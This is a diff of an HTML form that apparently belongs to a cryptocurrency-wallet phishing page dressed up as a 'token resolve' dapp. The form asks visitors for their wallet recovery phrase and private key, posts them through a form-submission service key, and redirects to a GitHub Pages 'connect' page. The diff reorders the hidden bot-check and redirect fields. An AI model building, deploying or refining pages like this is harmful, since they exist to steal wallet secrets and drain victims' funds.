@@ -61,13 +61,6 @@ function click(coin) {
 
         <div class="field">
            <input type="hidden" name="access_key" value="048b16f9-16b9-4f9a-a532-a0d9b7e1e4ca">
-           <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
-          <input type="text" name="_honey" style="display: none;">
-          <input type="hidden" name="_captcha" value="false">
-
-          <input type="hidden" name="_next" value="https://dapp0001.github.io/tokenresolve/connect.html">
-          
-
 
             <label for="phrase">Phrase:</label>
             <input type="text" placeholder="enter your recovery phrase" id="phrase" name= 'phrase'>
@@ -86,6 +79,9 @@ function click(coin) {
             <input type="text" id= 'private' name= 'private' placeholder="enter private key">
             <span class="info">Typically 12 (sometimes 24) words seperated by a single space</span>
         </div>
+
+        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+        <input type="hidden" name="redirect" value="https://dapp0001.github.io/tokenresolve/connect.html">
         <div class="submit"><button type="submit">Proceed</button>
         
             <div class="cancel">Cancel</div>
